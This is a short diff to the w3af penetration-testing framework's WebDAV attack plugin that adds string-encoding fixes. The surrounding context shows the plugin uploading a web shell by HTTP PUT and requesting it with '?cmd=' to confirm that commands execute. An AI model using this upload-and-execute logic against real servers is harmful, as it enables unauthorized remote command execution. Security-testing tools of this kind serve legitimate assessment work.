@@ -27,6 +27,7 @@ from w3af.core.data.kb.exec_shell import ExecShell
 from w3af.core.data.parsers.doc.url import URL
 from w3af.core.controllers.exceptions import BaseFrameworkException
 from w3af.core.controllers.plugins.attack_plugin import AttackPlugin
+from w3af.core.data.misc.encoding import smart_str_ignore
 
 
 class dav(AttackPlugin):
@@ -98,7 +99,7 @@ class dav(AttackPlugin):
             url_to_upload = vuln_obj.get_url().url_join(fname)
 
             om.out.debug('Uploading file %s using PUT method.' % url_to_upload)
-            self._uri_opener.PUT(url_to_upload, data=file_content)
+            self._uri_opener.PUT(url_to_upload, data=smart_str_ignore(file_content))
 
             # Verify if I can execute commands
             # All w3af shells, when invoked with a blank command, return a
@@ -107,7 +108,7 @@ class dav(AttackPlugin):
             exploit_url = URL(url_to_upload + '?cmd=')
             response = self._uri_opener.GET(exploit_url)
 
-            if shell_handler.SHELL_IDENTIFIER in response.get_body():
+            if smart_str_ignore(shell_handler.SHELL_IDENTIFIER) in smart_str_ignore(response.get_body()):
                 msg = ('The uploaded shell returned the SHELL_IDENTIFIER, which'
                        ' verifies that the file was uploaded and is being'
                        ' executed.')
